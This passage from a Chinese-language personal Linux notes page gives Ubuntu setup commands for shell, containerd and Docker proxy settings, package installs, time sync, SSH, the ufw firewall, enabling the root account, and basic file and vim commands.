class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 1. 编辑 ~/.bashrc（用户级别、系统级别）</span><br>vim ~/.bashrc<br><br><br><span class="hljs-comment"># 2. 添加内容</span><br><span class="hljs-comment"># 2.1. 以太网</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-variable">$https_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">NO_PROXY</span>=<span class="hljs-variable">$no_proxy</span><br><br><span class="hljs-comment"># 2.2. WLAN</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://182.32.37.244:7890&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://182.32.37.244:7890&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-variable">$https_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">NO_PROXY</span>=<span class="hljs-variable">$no_proxy</span><br><br><br>no_proxy 是不走代理的网络地段，就是访问这些地址的时候，不走代理，本机直连<br><br><span class="hljs-comment"># 3. 使命令生效（有时候需要重启 NAT Service）</span><br>source ~/.bashrc<br><br><br><span class="hljs-comment"># 4. 检测能否访问外网</span><br>curl www.google.com<br><br><br><span class="hljs-comment"># 5. 补充：临时代理（会话级别）</span><br><span class="hljs-comment"># 2.1. 以太网</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-variable">$http_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-variable">$https_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">NO_PROXY</span>=<span class="hljs-variable">$no_proxy</span><br><br><span class="hljs-comment"># 2.2. WLAN</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://182.32.37.244:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://182.32.37.244:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-variable">$http_proxy</span> &amp;&amp;<span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-variable">$https_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">NO_PROXY</span>=<span class="hljs-variable">$no_proxy</span><br><br><br><span class="hljs-comment"># 6. 补充：临时禁用代理（会话级别）</span><br>unset http_proxy<br>unset https_proxy<br>unset no_proxy<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>NO_PROXY</code> 配置指定了在请求发送到这些地址时，流量将直接访问目标服务器，不经过代理服务器。在 Kubernetes 环境中，某些特定的 IP 地址（如 Master 节点和虚拟 IP）应禁用代理。</li><li>推荐仅为 root 用户配置代理，或者<strong>仅使用临时代理</strong></li><li>命令行工具虽然能够访问外网，但 Kubernetes 的容器运行时（如 containerd 或 Docker）并不会自动读取继承这些环境变量，导致容器无法通过代理访问外网，从而无法拉取镜像。为了解决这个问题，我们可以设置 containerd 代理</li><li>我发现设置完临时代理后，都要再启动一下 VM NAT 服务（<code>services.msc</code>）</li></ol></blockquote><p>&#x3D;&#x3D;4.设置 containerd 代理（K8s 需要）&#x3D;&#x3D;</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 1. 创建代理配置目录</span><br>sudo mkdir -p /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/containerd.service.d<br><br><br><span class="hljs-comment"># 2. 生成并配置代理文件</span><br><span class="hljs-comment"># 2.1. 以太网</span><br>cat &lt;&lt;EOF | sudo tee /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/containerd.service.d/proxy.conf<br>[Service]<br>Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://172.20.10.3:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://172.20.10.3:7890&quot;</span><br>NO_PROXY=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span><br>EOF<br><br><br><span class="hljs-comment"># 2.2. WLAN</span><br>cat &lt;&lt;EOF | sudo tee /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/containerd.service.d/proxy.conf<br>[Service]<br>Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://182.32.38.66:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://182.32.38.66:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1,10.96.0.1,192.168.136.0/24,10.244.0.0/16,.svc,.cluster.local&quot;</span><br>EOF<br><br><br><span class="hljs-comment"># 3. 重载配置并重启服务</span><br>sudo <span class="hljs-params">system</span>ctl daemon-reload &amp;&amp; sudo <span class="hljs-params">system</span>ctl restart containerd<br><br><br><span class="hljs-comment"># 4. 验证环境变量是否注入成功</span><br>sudo <span class="hljs-params">system</span>ctl <span class="hljs-literal">show</span> --property Environment containerd<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>命令 <code>cat &lt;&lt;EOF | sudo tee /etc/systemd/system/containerd.service.d/proxy.conf</code> <strong>是覆盖写入</strong>，如果需要更换代理，直接运行命令即可。</li></ol></blockquote><p>&#x3D;&#x3D;5.设置 Docker 代理&#x3D;&#x3D;</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 1. 创建代理配置目录</span><br>sudo mkdir -p /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/docker.service.d<br><br><br><span class="hljs-comment"># 2. 生成并配置代理文件</span><br><span class="hljs-comment"># 2.1. 以太网</span><br>cat &lt;&lt;EOF | sudo tee /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/docker.service.d/proxy.conf<br>[Service]<br>Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://172.20.10.3:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://172.20.10.3:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span><br>EOF<br><br><br><span class="hljs-comment"># 2.2. WLAN</span><br>cat &lt;&lt;EOF | sudo tee /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/docker.service.d/proxy.conf<br>[Service]<br>Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://113.128.71.31:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://113.128.71.31:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1,10.96.0.1,192.168.136.0/24,10.244.0.0/16,.svc,.cluster.local&quot;</span><br>EOF<br><br><br><span class="hljs-comment"># 3. 重载配置并重启服务</span><br>sudo <span class="hljs-params">system</span>ctl daemon-reload &amp;&amp; sudo <span class="hljs-params">system</span>ctl restart docker<br><br><br><span class="hljs-comment"># 4. 验证环境变量是否注入成功</span><br>sudo <span class="hljs-params">system</span>ctl <span class="hljs-literal">show</span> --property Environment docker<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.补充：环境变量相关命令&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 设置系统环境变量（用户级别、系统级别）</span><br>vim ~/.bashrc<br><br><br><span class="hljs-comment"># 2. 设置临时环境变量（会话级别，防止暴露）</span><br><span class="hljs-built_in">export</span> DOCKER_REGISTRY_SERVER=<span class="hljs-string">&quot;your-docker-registry-server&quot;</span><br><br><br><span class="hljs-comment"># 3. 清除临时环境变量（会话级别）</span><br><span class="hljs-built_in">unset</span> DOCKER_REGISTRY_SERVER<br><br><br><span class="hljs-comment"># 4. 输出环境变量（变量引用加 &quot;&quot; 是最佳实践）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DOCKER_REGISTRY_SERVER=&quot;</span><br><br><span class="hljs-string">&quot;<span class="hljs-variable">$DOCKER_REGISTRY_SERVER</span>&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-4-更新系统软件包"><a href="#2-4-更新系统软件包" class="headerlink" title="2.4. 更新系统软件包"></a>2.4. 更新系统软件包</h3><p>更新系统软件包可以确保所有软件包都是最新的，减少漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update &amp;&amp; <span class="hljs-built_in">sudo</span> apt upgrade -y<br></code></pre></td></tr></table></figure><hr><h3 id="2-5-安装常用工具-服务"><a href="#2-5-安装常用工具-服务" class="headerlink" title="2.5. 安装常用工具 &#x2F; 服务"></a>2.5. 安装常用工具 &#x2F; 服务</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">sudo apt install -y vim curl wget git htop <span class="hljs-built_in">net</span>-tools unzip zip <span class="hljs-built_in">tree</span> dos2unix openssl chrony nmap openssh-server telnet<br></code></pre></td></tr></table></figure><ul><li><code>curl/wget</code>：用于下载文件</li><li><code>git</code>：版本控制</li><li><code>htop</code>：进程管理</li><li><code>net-tools</code>：查看网络信息（如 <code>ifconfig</code>）</li><li><code>unzip/zip</code>：解压缩工具</li><li><code>tree</code>：查看目录结构</li><li><code>dos2unix</code>：将 shell 转为 Unix 格式</li><li><code>chrony</code>：时间同步</li><li><code>telnet</code>：测试节点间是否联通的</li></ul><hr><h3 id="2-6-安装-JDK"><a href="#2-6-安装-JDK" class="headerlink" title="2.6. 安装 JDK"></a>2.6. 安装 JDK</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 1. 安装 JDK 8</span><br>sudo apt <span class="hljs-keyword">install </span>-y openjdk<span class="hljs-number">-8</span>-<span class="hljs-keyword">jdk</span><br><span class="hljs-keyword"></span><br><br><span class="hljs-comment"># 2. 安装 JDK 17</span><br>sudo apt <span class="hljs-keyword">install </span>-y openjdk<span class="hljs-number">-17</span>-<span class="hljs-keyword">jdk</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-7-进行时间同步"><a href="#2-7-进行时间同步" class="headerlink" title="2.7. 进行时间同步"></a>2.7. 进行时间同步</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 启动并开机自启动 chrony</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> chrony &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl start chrony<br><br><br><span class="hljs-comment"># 2. 查看当前时间同步源（NTP 服务器）的状态</span><br>chronyc sources<br></code></pre></td></tr></table></figure><hr><h3 id="2-8-开启-SSH-服务"><a href="#2-8-开启-SSH-服务" class="headerlink" title="2.8. 开启 SSH 服务"></a>2.8. 开启 SSH 服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 启动并开机自启动 SSH</span><br><span class="hljs-built_in">sudo</span> systemctl start ssh<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> ssh<br><br><br><span class="hljs-comment"># 2. 启用 SSH 端口（默认端口为 22）</span><br><span class="hljs-built_in">sudo</span> ufw allow 22/tcp<br><br><br><span class="hljs-comment"># 3. 检查 SSH 服务是否正常运行</span><br><span class="hljs-built_in">sudo</span> systemctl status sshd<br></code></pre></td></tr></table></figure><hr><h3 id="2-9-设置主机名"><a href="#2-9-设置主机名" class="headerlink" title="2.9. 设置主机名"></a>2.9. 设置主机名</h3><p>&#x3D;&#x3D;1.设置主机名&#x3D;&#x3D;</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">myserver</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.修改本地 DNS&#x3D;&#x3D;<br>修改本地 DNS 后，本机请求中的<code>myserver</code> 就会被解析为 <code>localhost</code>，指向本机地址。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"># <span class="hljs-number">1</span>. 编辑 /etc/hosts<br>sudo vim /etc/hosts<br><br><br># <span class="hljs-number">2</span>. 修改本地 DNS<br><span class="hljs-number">127.0.0.1</span> localhost myserver<br></code></pre></td></tr></table></figure><hr><h3 id="2-10-防火墙配置"><a href="#2-10-防火墙配置" class="headerlink" title="2.10. 防火墙配置"></a>2.10. 防火墙配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 启用防火墙</span><br><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">enable</span><br><br><br><span class="hljs-comment"># 2. 关闭防火墙</span><br><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">disable</span><br><br><br><span class="hljs-comment"># 3. 查看防火墙状态</span><br><span class="hljs-built_in">sudo</span> ufw status<br><br><br><span class="hljs-comment"># 4. 开放端口（推荐显式指定协议，否则同时处理 TCP 和 UDP 数据）</span><br><span class="hljs-comment"># 4.1. 开放 HTTP 端口（如果需要）</span><br><span class="hljs-built_in">sudo</span> ufw allow 80/tcp<br><br><span class="hljs-comment"># 4.2. 开放 HTTPS 端口（如果需要）</span><br><span class="hljs-built_in">sudo</span> ufw allow 443/tcp<br><br><span class="hljs-comment"># 4.3. 开放 SSH 端口</span><br><span class="hljs-built_in">sudo</span> ufw allow 22/tcp<br></code></pre></td></tr></table></figure><hr><h3 id="2-11-启用-root-用户"><a href="#2-11-启用-root-用户" class="headerlink" title="2.11. 启用 root 用户"></a>2.11. 启用 root 用户</h3><p>Ubuntu 默认禁用了 <code>root</code> 用户，因为 Ubuntu 不推荐直接以 <code>root</code> 账户登录，而是鼓励用户使用 <code>sudo</code> 提升权限来执行管理员任务，如果我们有特殊需求，如某些环境必须使用 root 登录，可以选择启用 root 用户</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery">sudo passwd<span class="hljs-built_in"> root</span><br><br>su<span class="hljs-built_in"> root</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 补充：</p><ol><li>Ubuntu 出于安全性考虑，默认禁用了 <code>root</code> 用户的 SSH 远程登录，如果你确实需要 <code>root</code> 通过 SSH 登录，可以手动修改 SSH 配置</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 编辑 /etc/ssh/sshd_config</span><br><span class="hljs-built_in">sudo</span> vim /etc/ssh/sshd_config<br><br><br><span class="hljs-comment"># 2. 修改 PermitRootLogin</span><br>PermitRootLogin prohibit-password   -&gt;   PermitRootLogin <span class="hljs-built_in">yes</span>   <span class="hljs-comment"># 如果 PermitRootLogin 被注解，直接添加</span><br><br><br><span class="hljs-comment"># 3. 重启 SSH</span><br><span class="hljs-built_in">sudo</span> systemctl restart ssh<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：SFTP 子系统申请已拒绝</p></blockquote><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 1. 添加以下内容</span><br>Sub<span class="hljs-params">system</span> sftp internal-sftp<br><br><br><span class="hljs-comment"># 2. 重启 ssh</span><br>sudo <span class="hljs-params">system</span>ctl restart ssh<br></code></pre></td></tr></table></figure><hr><h2 id="3-查看-CPU-架构"><a href="#3-查看-CPU-架构" class="headerlink" title="3. 查看 CPU 架构"></a>3. 查看 CPU 架构</h2><p>在下面的命令中，<code>x86_64</code>：就是 amd64，<code>aarch64</code>：就是 arm64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -m<br></code></pre></td></tr></table></figure><hr><h2 id="4-重启电脑"><a href="#4-重启电脑" class="headerlink" title="4. 重启电脑"></a>4. 重启电脑</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> reboot<br></code></pre></td></tr></table></figure><hr><h2 id="5-创建目录、文件"><a href="#5-创建目录、文件" class="headerlink" title="5. 创建目录、文件"></a>5. 创建目录、文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 创建目录</span><br><span class="hljs-built_in">mkdir</span> -p <br><br><br><span class="hljs-comment"># 2. 创建文件</span><br><span class="hljs-built_in">touch</span><br><br><br><span class="hljs-comment"># 3. 删除目录 / 文件</span><br><span class="hljs-built_in">rm</span> -rf <br></code></pre></td></tr></table></figure><hr><h2 id="6-vim"><a href="#6-vim" class="headerlink" title="6. vim"></a>6. vim</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 使用 vim 编辑</span><br>vim <br><br><br><span class="hljs-comment"># 2. 保存</span><br>wq<br><br><br><span class="hljs-comment"># 3. 强制保存</span><br><span class="hljs-symbol">:w!</span><br><br><br><span class="hljs-comment"># 4. 强制退出</span><br>q!<br></code></pre></td></tr></table></figure><hr><h2 id="7-追加"><a href="#7-追加" class="headerlink" title="7. 追加"></a>7. 追加</h2><p><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/image-20250514173030553.png"></p><p>下面是覆盖<br><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/image-20250514173059391.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 7. 安装 dos2unix 工具（如果没有就安装）</span><br>command -v dos2unix &gt;<span class="hljs-regexp">/dev/</span>null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> || sudo apt-get install -y dos2unix<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">为什么在 Shell 脚本中不推荐使用这种简洁写法？因为这一行执行时，用户根本不知道你做了什么，除非主动去翻源码才能搞清楚。而采用更明确的写法则更友好：比如在执行脚本的过程中，你可以清楚看到“正在检查哪个工具”，也能知道“这个工具是已安装的”还是“刚刚被安装的”。这种信息透明的方式在编写运维脚本或部署脚本时尤其重要，因为这类脚本通常需要被他人复用。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 8. 将脚本转为 Unix 格式</span><br>dos2unix es-shell.sh<br></code></pre></td></tr></table></figure><hr><h2 id="8-Linux-脚本（ES-脚本（注释版）-sh）"><a href="#8-Linux-脚本（ES-脚本（注释版）-sh）" class="headerlink" title="8. Linux 脚本（ES 脚本（注释版）.sh）"></a>8. Linux 脚本（ES 脚本（注释版）.sh）</h2><p><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/image-20250516154950604.png"></p><p><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/image-20250516154744807.png"></p><p>创建目录，先想想是不是需要检查并删除旧的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span 